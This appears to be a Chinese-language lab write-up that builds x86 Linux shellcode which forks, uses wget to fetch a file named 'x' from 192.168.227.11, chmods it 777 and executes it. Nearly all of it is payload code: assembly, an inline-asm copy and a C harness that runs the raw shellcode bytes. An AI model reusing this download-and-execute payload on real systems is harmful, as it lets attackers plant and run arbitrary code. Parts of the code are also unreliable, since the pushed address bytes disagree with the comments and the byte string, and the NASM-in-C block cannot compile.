## shellcode_ download file_ linux_x86

### 一、实验环境

* ubuntu 14.04 x86

### 二、实验过程

* shellcode编程思路

        start
    	  execve wget file_x
    	  chmod +x file_x
    	  execve file_x
    	end


* 面临的问题
	* 当进程调用一种exec函数时,如果调用成功则加载新的程序从启动代码开始执行,该进程的用户空间代码和数据完全被新程序替换。调用成功时调用exec函数的程序不再返回,如果调用出错则返回-1。所以exec函数只有出错的返回值而没有成功的返回值。

* 解决方法
	* 使用fork&wait
		* fork()：创建子进程,在子进程中，fork函数返回0，在父进程中，fork返回新创建子进程的进程ID。我们可以通过fork返回的值来判断当前进程是子进程还是父进程。
		* wait():如果父进程的所有子进程都还在运行，调用wait将使父进程阻塞，子进程结束后获取子进程状态改变信息

* 解决后思路

    	start
    	  fork
    	  cmp
    	  if child goto child
    	  wait for child
    	  chmod +x file_x
    	  execve file_x
    	
    	  child:
    		execve wget file_x
    	end

* 汇编程序

        global _start
    	section .text
    	_start:
    	;fork
    	xor eax,eax ; eax寄存器清零
    	mov al,0x2 ; x86平台32位Linux系统调用号 #define __NR_fork  2
    	int 0x80 ;启动系统调用需要使用INT指令。linux系统调用位于中断0x80，执行INT指令时，所有操作转移到内核中的系统调用处理程序，完成后执行转移到INT指令之后的下一条指令。
    	xor ebx,ebx
    	cmp eax,ebx ;ZF=0
    	jz child ;jump if zero(ZF=0)
      
    	;wait(NULL)
    	xor eax,eax ; eax寄存器清零
    	mov al,0x7 ; #define __NR_waitpid 7
    	int 0x80
    		
    	;chmod x
    	xor ecx,ecx
    	xor eax, eax
    	push eax
    	mov al, 0xf ;#define __NR_chmod 15
    	push 0x78 ; x：下载文件名
    	mov ebx, esp
    	xor ecx, ecx
    	mov cx, 0x1ff ; 0x1ff换算为8进制为777，通过按位与运算计算权限。(参数）
    	int 0x80
    	
    	;exec x
    	xor eax, eax
    	push eax
    	push 0x78 ; x：下载文件名
    	mov ebx, esp
    	push eax
    	mov edx, esp
    	push ebx
    	mov ecx, esp
    	mov al, 11 ; #define __NR_execve 11
    	int 0x80
    	
    	child:
    
    	;download 192.168.227.11//x with wget
    	push 0xb ; #define __NR_execve 11
    	pop eax
    	cdq ;
		
    	push edx
    	push 0x782f2f32	;2//x avoid null byte
    	push 0x32322e32 ;2.22
    	push 0x2e383631 ;168.
    	push 0x2e323931 ;192.
    	mov ecx,esp 
		
    	push edx
    	push 0x74 ;t
    	push 0x6567772f ;egw/
    	push 0x6e69622f ;nib/
    	push 0x7273752f ;rsu/
    	mov ebx,esp 
		
    	push edx
    	push ecx
    	push ebx
    	mov ecx,esp
    	int 0x80
	

main()

{

    __asm__("

        global _start
    	section .text
    	_start:
    	;fork
    	xor eax,eax ; eax寄存器清零
    	mov al,0x2 ; x86平台32位Linux系统调用号 #define __NR_fork  2
    	int 0x80 ;启动系统调用需要使用INT指令。linux系统调用位于中断0x80，执行INT指令时，所有操作转移到内核中的系统调用处理程序，完成后执行转移到INT指令之后的下一条指令。
    	xor ebx,ebx
    	cmp eax,ebx ;ZF=0
    	jz child ;jump if zero(ZF=0)
      
    	;wait(NULL)
    	xor eax,eax ; eax寄存器清零
    	mov al,0x7 ; #define __NR_waitpid 7
    	int 0x80
    		
    	;chmod x
    	xor ecx,ecx
    	xor eax, eax
    	push eax
    	mov al, 0xf ;#define __NR_chmod 15
    	push 0x78 ; x：下载文件名
    	mov ebx, esp
    	xor ecx, ecx
    	mov cx, 0x1ff ; 0x1ff换算为8进制为777，通过按位与运算计算权限。(参数）
    	int 0x80
    	
    	;exec x
    	xor eax, eax
    	push eax
    	push 0x78 ; x：下载文件名
    	mov ebx, esp
    	push eax
    	mov edx, esp
    	push ebx
    	mov ecx, esp
    	mov al, 11 ; #define __NR_execve 11
    	int 0x80
    	
    	child:
    
    	;download 192.168.227.11//x with wget
    	push 0xb ; #define __NR_execve 11
    	pop eax
    	cdq ; 把EDX的所有位都设成EAX最高位的值
    	push edx
    	
    	push 0x782f2f32	;2//x avoid null byte
    	push 0x32322e32 ;2.22
    	push 0x2e383631 ;168.
    	push 0x2e323931 ;192.
    	mov ecx,esp ;保存堆栈指针X-16-8
    	push edx
    	
    	push 0x74 ;t
    	push 0x6567772f ;egw/
    	push 0x6e69622f ;nib/
    	push 0x7273752f ;rsu/
    	mov ebx,esp ；X-42-8
    	
		push edx
    	push ecx
    	push ebx
		
    	mov ecx,esp
    	int 0x80

     " );

}
* C语言程序

    	#include<stdio.h>
    	#include<string.h>
    	
    	unsigned char code[] = \
    	"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x2a\x31\xc0\xb0\x07\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x31\x31\x2f\x78\x68\x32\x32\x37\x2e\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";
    	
    	main()
    	{
    		printf("Shellcode Length:  %d\n", strlen(code));
    		int (*ret)() = (int(*)())code;
    		ret();
    	}

### 四、参考资料

https://govolution.wordpress.com/2014/02/02/writing-a-download-and-exec-shellcode/